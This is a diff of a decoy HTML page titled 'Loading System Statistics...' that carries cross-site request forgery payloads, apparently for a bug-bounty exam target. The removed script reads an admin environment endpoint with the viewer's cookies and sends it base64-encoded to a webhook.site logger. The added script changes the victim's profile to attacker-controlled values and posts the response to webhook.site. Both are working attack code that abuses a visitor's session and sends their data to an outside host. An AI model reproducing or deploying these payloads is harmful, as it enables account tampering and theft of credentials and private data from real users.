@@ -1,23 +1,33 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <script>
-        (async function() {
-            const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
-            const api = "https://api-bugbounty-exam.hashacademy.co/api";
-
-            try {
-                // Since the Admin is viewing this, the browser will include the Admin cookies!
-                const res = await fetch(api + '/admin/system/env', { credentials: 'include' });
-                const data = await res.json();
-                
-                // Exfiltrate the result to your webhook
-                new Image().src = logger + "/?FINAL_FLAG_DUMP=" + btoa(JSON.stringify(data));
-            } catch (e) {
-                new Image().src = logger + "/?ERROR=" + btoa(e.message);
+   <script>
+    fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/profile", {
+        method: "PATCH",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            "fullName": "Attacker_Controlled_Name",
+            "address": {
+                "street": "123 Exploit Way",
+                "city": "New York",
+                "state": "NY",
+                "zipCode": "10001",
+                "country": "United States"
             }
-        })();
-    </script>
+        }),
+        credentials: "include" // Forces browser to send victim's session cookies
+    })
+    .then(res => res.json())
+    .then(data => {
+        // Exfiltrates the response (containing sensitive user data/flags)
+        fetch("https://webhook.site/your-unique-id", {
+            method: "POST",
+            body: JSON.stringify(data)
+        });
+    });
+</script>
+________________________________________
+
     <h1>Loading System Statistics...</h1>
 </body>
 </html>
